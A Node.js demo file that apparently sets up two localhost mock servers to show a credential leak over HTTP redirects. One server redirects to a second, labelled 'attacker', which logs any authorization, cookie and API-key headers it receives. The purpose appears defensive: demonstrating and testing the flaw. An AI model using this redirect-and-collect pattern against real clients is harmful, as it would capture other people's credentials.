/**
 * demo/mock-servers.js
 *
 * Two tiny Node.js HTTP servers — no external dependencies.
 *
 * Server A (port 4001)  GET /start  →  302 redirect to Server B /collect
 * Server B (port 4002)  GET /collect → logs every request header received
 *                                       then replies 200 "ATTACKER RECEIVED"
 *
 * Usage (called by before.sh / after.sh):
 *   node demo/mock-servers.js &
 *   SERVERS_PID=$!
 *   ...
 *   kill $SERVERS_PID
 *
 * Or import the start/stop helpers:
 *   const { startServers, stopServers } = require('./demo/mock-servers.js')
 */

const http = require('http')

let serverA = null
let serverB = null

function startServers() {
    return new Promise((resolve, reject) => {
        serverB = http.createServer((req, res) => {
            console.log('\n── ATTACKER SERVER (B) received request ──')
            console.log(`  Path   : ${req.url}`)
            const interesting = Object.entries(req.headers).filter(([k]) =>
                ['authorization', 'cookie', 'x-api-key', 'x-auth-token'].includes(k.toLowerCase())
            )
            if (interesting.length > 0) {
                interesting.forEach(([k, v]) => console.log(`  HEADER : ${k}: ${v}`))
                console.log('  ⚠️  Credential header received by attacker!')
            } else {
                console.log('  (no credential headers received)')
            }
            res.writeHead(200, { 'content-type': 'text/plain' })
            res.end('attacker-collected\n')
        })

        serverB.listen(4002, '127.0.0.1', () => {
            serverA = http.createServer((req, res) => {
                if (req.url === '/start') {
                    res.writeHead(302, { location: 'http://127.0.0.1:4002/collect' })
                    res.end()
                } else {
                    res.writeHead(200)
                    res.end('server-a ok\n')
                }
            })
            serverA.listen(4001, '127.0.0.1', () => {
                resolve({ serverA, serverB })
            })
            serverA.on('error', reject)
        })
        serverB.on('error', reject)
    })
}

function stopServers() {
    return new Promise((resolve) => {
        let closed = 0
        const done = () => {
            if (++closed === 2) resolve(undefined)
        }
        if (serverA) serverA.close(done)
        else done()
        if (serverB) serverB.close(done)
        else done()
    })
}

module.exports = { startServers, stopServers }

// If called directly as a standalone process, start and keep running
if (require.main === module) {
    startServers()
        .then(() => {
            console.log('Mock servers running: A=http://127.0.0.1:4001  B=http://127.0.0.1:4002')
            console.log('Press Ctrl-C to stop.')
            process.on('SIGTERM', () => stopServers().then(() => process.exit(0)))
            process.on('SIGINT', () => stopServers().then(() => process.exit(0)))
        })
        .catch((err) => {
            console.error(err)
            process.exit(1)
        })
}
